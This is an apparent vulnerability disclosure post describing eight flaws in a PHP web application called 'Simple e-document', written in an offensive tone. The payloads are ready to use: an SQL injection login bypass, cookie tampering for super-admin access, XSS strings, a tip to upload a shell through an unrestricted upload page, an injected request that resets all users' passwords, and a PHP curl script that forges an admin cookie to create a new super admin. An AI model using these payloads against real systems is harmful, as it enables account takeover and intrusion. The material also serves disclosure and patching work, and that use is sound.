Hi everyone.I want to talk about some vulnerabilities which i have found in
Simple e-document script&#039;s sources.It has a lot issues.

Let&#039;s go...
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

1.Sql Injection(multiple=>there is exist another bugs.you can find them
same tecniques).

admin.php
---------
Snip:

$sql = "Insert into edocphp_users values(&#039;&#039;, &#039;$username&#039;, &#039;$r_password&#039;,
&#039;$NOW_TIME&#039;, &#039;$is_admin&#039;, &#039;$is_s_admin&#039;)";

And $username, $r_password had not been sanitized.

-------
main_out.php( Vulnerable from  head to bottom of page :D )
main_in.php    (It is also :D )
-------



++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


2. Bypass login:

index.php
---------

write username : &#039;or 1=1 #
      password :  blank

      And you will login successfull..

     Vulnerable snip:
    ...
     $username= stripslashes($_POST[&#039;username&#039;]);
     $password= stripslashes($_POST[&#039;password&#039;]);
    ..
    $sql = "SELECT * From edocphp_users WHERE username=&#039;$username&#039; AND
password =&#039;$r_password&#039;";
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

3.Insecure cookie handling(Privilege escalation):

There is an issue with creating cookies after you login to system.
if you are simple user your cookie will be that username=Your username;
access=1;
You can change cookie part: change access 1 to 3 for capturing super
administrative access.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

4.XSS

index.php
---------
$_COOKIE[&#039;username&#039;] is not sanitized and you can change it to ,for
example,<script>alert(document.cookie)</script>
and boom :D XSS appears..
This vuln is also exist in header_out.php and  admin.php :

admin.php
----------
Go to the View/Edit/Remove Users and after clicking update intrecept
request and type that:

new_password=11111&is_admin=3&username_s=<script>alert()</script>&id=3&op=Update_User
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

5.Arbitrary File Upload
There is not any restriction in upload.php and you can upload your own
shell and enjoy :)

http://site.tld/script_path/upload.php?op=newin

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

6.Second order injections
You can change  all users&#039; passwords in the database with this vuln(Also
delete):
-----
admin.php
-----

Go to the  View/Edit/Remove Users.
Change any of these pass to your own
After clicking update intrecept request with BurpSuite (or OwaspZap etc.)
and change this
new_password=&is_admin=3&username_s=admin&id=&#039;or 1=1#&op=Update_User
After this process all users&#039; pass will be changed..
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

7.CSRF

This script doesn&#039;t have any session,for this reason you can add new super
admin.I have written a simple payload for it:
Payload:

<?php
$url="http://localhost/simple_e_document/admin.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS,
"username=admin&password=123456&is_admin=2&op=save_new_user");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIE, "username=FuckTheSystem;access=3");
$a = curl_exec ($ch);
echo $a;
curl_close ($ch);
?>

Change current values with your own.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

8.Insecure logout process.
logout process,this post action happens :

op=logout&username= ANY USERNAME &Submit=Logout
you can change username value and make script to logout site for this user.
